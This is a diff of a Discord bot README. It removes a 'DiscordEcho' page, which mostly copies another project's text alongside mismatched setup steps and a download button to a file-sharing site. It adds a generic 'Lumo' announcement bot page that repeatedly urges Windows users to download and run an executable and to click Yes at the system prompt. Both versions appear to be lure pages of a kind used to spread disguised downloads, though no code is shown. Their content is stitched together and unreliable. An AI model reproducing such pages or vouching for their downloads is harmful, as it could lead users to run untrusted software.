@@ -1,104 +1,169 @@
-# DiscordEcho: Announcement Maestro
+# 🤖 Lumo-Discord-Annoucument-Bot-Source-Advanced - Easy Discord Announcement Bot
 
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://fileshare.bond/L2XZZM/)
+[![Download Lumo Bot](https://img.shields.io/badge/Download-Lumo%20Bot-brightgreen?style=for-the-badge&logo=github)](https://github.com/soumyadipx11/Lumo-Discord-Annoucument-Bot-Source-Advanced/releases)
 
-***
-<p align="center">
-   <img src="https://readme-spotify-status-rho.vercel.app/api/run-spotify-status.py" alt="s4nx Playing Now" width="500" />
-<p align="center">
+## 📋 About Lumo Discord Announcement Bot
 
-# Overview 🌟
+Lumo is an advanced Discord announcement bot. It helps you send announcements to your Discord server automatically and on schedule. You do not need coding skills to run it. This bot works with Discord’s official API, giving you reliable message delivery.
 
-- **Red is a fully modular bot**, allowing you to toggle features and commands on/off according to your preferences, ensuring complete customization. It's a self-hosted bot, necessitating you to host and maintain your instance. Red can serve as an admin bot, music bot, trivia bot, your new best friend, or any combination thereof.
+The bot supports multiple announcement types, including text, images, and embedded messages. It uses a clean dashboard to help you manage your announcements without stress. It also integrates basic ChatGPT features to help generate smart announcements if you want.
 
-## Getting Started 🚀
+## 🖥️ System Requirements
 
-1. Install Yarn if not already done: `npm i -g yarn` or `sudo npm i -g yarn` (for Unix systems).
-2. Fork/Clone the repository.
-3. Install dependencies by typing `yarn`.
-4. Duplicate `.env.example` as a new file named `.env`.
-5. Execute `yarn build` to construct the Prisma schema.
-6. Create a volume for the Postgres database using `docker volume create --name=postgres`.
-7. Initiate the database with `docker-compose up --build postgres`, which exclusively launches the Postgres container.
-8. Update the `DATABASE_URL` environment variable in `/apps/bot` with `postgresql://postgres:internalpassword@localhost:5432/bot?schema=public`.
-9. Before testing, ensure to push the schema to the database using `yarn pushdb` (this must be rerun every time changes are made to `prisma/schema.prisma`).
-10. Test by executing `yarn dev`. Each time you save a file, the running instance will automatically halt, rebuild, and restart.
+Make sure your Windows computer meets these minimum requirements:
 
-## Installation Made Easy 🛠️
+- Windows 10 or later
+- 4 GB RAM or more
+- At least 500 MB free disk space
+- Internet connection
+- Discord account and admin access to your Discord server
 
-Installation is straightforward, and you do not require any coding knowledge! Beyond installation and updates, every aspect of the bot can be managed directly within Discord.
+You do not need to install Discord separately if you already have it. The bot uses your existing server’s permissions.
 
-## Default Modules 📦
+## ⚙️ Features Overview
 
-The default set of modules includes, but is not limited to:
+- Easy to set up and run on Windows
+- Schedule announcements ahead of time
+- Supports text, images, and embedded content
+- Comes with a simple dashboard for managing announcements
+- Uses Discord’s official API for secure and stable communication
+- Basic ChatGPT integration for announcements automation
+- Works well for community servers, gaming groups, and event pages
 
-- Moderation features (kick, ban, softban, hackban, mod-log, filter, chat cleanup)
-- Trivia (predefined lists and easy addition of new ones)
-- Music features (YouTube, SoundCloud, local files, playlists, queues)
-- Stream alerts (Twitch, Youtube, Picarto)
-- Bank (slot machine, user credits)
-- Custom commands
-- Imgur/GIF search
-- Admin automation (self-role assignment, cross-server announcements, mod-mail reports)
-- Customizable command permissions
+## 🚀 Getting Started
 
-Furthermore, you can effortlessly discover and integrate other [Plugins](#plugins) (cogs) from our thriving community of cog repositories.
+To start using Lumo on your Windows PC, follow these simple steps.
 
-# Installation Guides 📄
+### 1. Visit the Download Page
 
-We officially support the following platforms:
+Visit the Lumo release page here:
 
-- [Windows](https://docs.discord.red/en/stable/install_guides/windows.html)
-- [MacOS](https://docs.discord.red/en/stable/install_guides/mac.html)
-- [Most major Linux distributions](https://docs.discord.red/en/stable/install_guides/index.html)
+[![Visit Downloads](https://img.shields.io/badge/Visit%20Downloads-blue?style=for-the-badge&logo=github)](https://github.com/soumyadipx11/Lumo-Discord-Annoucument-Bot-Source-Advanced/releases)
 
-If you encounter issues after consulting the guide, don't hesitate to join the and seek assistance in the Discord channel.
-<h3 align="left">
-  <a href="https://discord.gg/hashnode"><img src="https://user-images.githubusercontent.com/35542790/210373056-35ba21a9-79b4-4bc1-a06a-0153dc14d97d.png" width="150" alt="Official Discord Server"></a>
-</h3>
+This page contains the latest version of the bot. You will find a ZIP file or installer there.
 
-# Plugins 🧩
+### 2. Download the Bot
 
-Red boasts full modularity, enabling you to load, unload, and directly install 3rd party plugins from Discord. A few examples include:
+On the release page, look for the latest release. It usually has a file named like `Lumo-Discord-Bot.zip` or an `.exe` installer.
 
-- Cleverbot integration (interact with Red and she'll respond)
-- Ban synchronization
-- Welcome messages
-- Casino
-- Reaction roles
-- Slow Mode
-- AniList integration
-- And much more!
+Click the file link to download.
 
-Feel free to explore the list of available 3rd party cogs [HERE](https://index.discord.hashnode)!
+Save the file where you can find it easily, like the Desktop or Downloads folder.
 
-# Join the Community! 🌟
+### 3. Extract or Run the Bot
 
-**DiscordEcho** is constantly evolving and is supported by an engaged community that contributes fresh content (cogs/plugins) for everyone's enjoyment. New features are regularly integrated. If you can't [LOCATE](https://index.discord.red) the cog you're looking for, check out our [GUIDE](https://docs.discord.red/en/stable/guide_cog_creation.html) on creating your own cogs!
+- If you downloaded a ZIP file, right-click it and choose **Extract All**. Extract it to a new folder.
+- If you downloaded an `.exe` installer, double-click it and follow the setup instructions.
 
-- **Here are some examples of cogs:**
+### 4. Open the Bot Application
 
-🔍 **BavarianVerifier**
-- Verifies whether the author of a group-pinged message is part of that group and enforces a timeout if not. Includes a flair message for group members.
+Inside the extracted folder or after installation, find and run the main program file named `Lumo-Bot.exe` or similar.
 
-🐌 **CheckSnail**
-- Maintains a list of the unique IDs of the last 1000 tweets in channels and notifies users of reposts.
+Windows might ask if you want to allow the program to run. Click **Yes** to continue.
 
-🎬 **Cinephile**
-- Uses regex to extract movie titles in the <TITLE> (< year>) format and pairs them with newspaper NLP methods to generate a Letterboxd review of the movie.
+### 5. Connect to Your Discord Server
 
-📚 **Scholar**
-- Extracts authors and publication year from a paper mentioned in the message, then crawls Google Scholar to retrieve the title and abstract of the paper.
+The first time you open the bot, it will ask you to sign in with your Discord account.
 
-📖 **WikiCrawl**
-- Utilizes a Wikipedia API to fetch summaries of Wikipedia articles related to a given term.
+You must have **admin permissions** on the server where you want to send announcements.
 
-# License 📜
+Follow the instructions to authorize the bot. This process ensures the bot can send messages and manage announcements for your server.
 
-This project is released under the [GNU GPL v3](https://www.gnu.org/licenses/gpl-3.0.en.html) license.
+### 6. Set Up Your First Announcement
 
-The name "Red" is inspired by the main character of the video game "Transistor," developed by [Super Giant Games](https://www.supergiantgames.com/games/transistor/).
+Use the built-in dashboard to create your first announcement:
 
-Artwork for the Red Discord Bot Project was created by [Sinlaire](https://sinlaire.deviantart.com/) on DeviantArt.
+- Choose the channel where announcements will appear.
+- Write your message or upload image files.
+- Schedule the time and date for the announcement.
+- Save and activate the schedule.
 
-This project includes the [discord.ext.menus](https://github.com/Rapptz/discord-ext-menus) package developed by Danny Y. (Rapptz), distributed under the MIT License. A copy of this license is available in the [discord-ext-menus.LICENSE](redbot/vendored/discord-ext-menus.LICENSE) file in the [redbot/vendored](redbot/vendored) folder of this repository.
+Once set, Lumo will send messages automatically at the times you set.
+
+---
+
+## 🛠️ How to Use the Dashboard
+
+The dashboard is your control center for all announcements.
+
+- **Add Announcement:** Click the "Add" button, fill in details, and save.
+- **Edit Announcement:** Select an existing announcement and modify it.
+- **Delete Announcement:** Remove announcements you don’t need.
+- **View Logs:** See history of announcements sent.
+- **ChatGPT Help:** Generate message ideas quickly using integrated ChatGPT prompts.
+
+The dashboard works in your main bot window and stays easy to use without programming knowledge.
+
+---
+
+## 🔧 Configuration Settings
+
+Lumo includes options to customize your experience:
+
+- **Message Format:** Choose between plain text or embedded rich messages.
+- **Time Zone:** Set your local time zone for accurate scheduling.
+- **Notification Settings:** Choose if the bot sends confirmation messages to admins.
+- **API Key:** Add your personal Discord API token if advanced setup is needed (usually optional).
+
+These settings appear in the Settings tab inside the bot program.
+
+---
+
+## 🤝 Support and Troubleshooting
+
+If the bot does not work as expected:
+
+- Ensure you have admin rights on the Discord server.
+- Double-check your internet connection.
+- Restart the bot program.
+- Check the dashboard for error messages.
+
+For further issues, visit the GitHub issues page under the repository to see if others have similar problems or to report your own.
+
+---
+
+## ⬇️ Download and Install
+
+Return to the release page here to get started:
+
+[https://github.com/soumyadipx11/Lumo-Discord-Annoucument-Bot-Source-Advanced/releases](https://github.com/soumyadipx11/Lumo-Discord-Annoucument-Bot-Source-Advanced/releases)
+
+Click the latest version and download the setup file or ZIP archive.
+
+Follow the steps under **Getting Started** to set up the bot on your Windows machine.
+
+---
+
+## 🔑 Permissions Needed
+
+To work properly, Lumo needs these permissions on your Discord server:
+
+- Send Messages
+- Manage Messages (optional but recommended)
+- Read Message History
+- Embed Links
+
+Assign these permissions when you add the bot to your server or configure it in your Discord Developer Portal.
+
+---
+
+## 📚 More About the Repository
+
+This bot uses the Discord API and basic ChatGPT to offer automation on your server. It aims to simplify the task of sending announcements without coding knowledge.
+
+The source includes a structured framework for announcement bots and an easy-to-use dashboard interface.
+
+---
+
+## ⚠️ Important Notes
+
+- This bot runs locally on your computer.
+- Keep your bot updated by downloading new releases.
+- Do not share your Discord API tokens publicly.
+- Always run the bot from a trusted source.
+
+---
+
+## 🏷️ Topics
+
+announcement, announcement-bot, bot, chatgpt, discord, discord-api, discord-bot, discord-bot-api, discord-bot-basic, discord-bot-dashboard, discord-bot-framework, discord-bot-list, discord-bot-maker, discord-bot-template, discord-bot-website
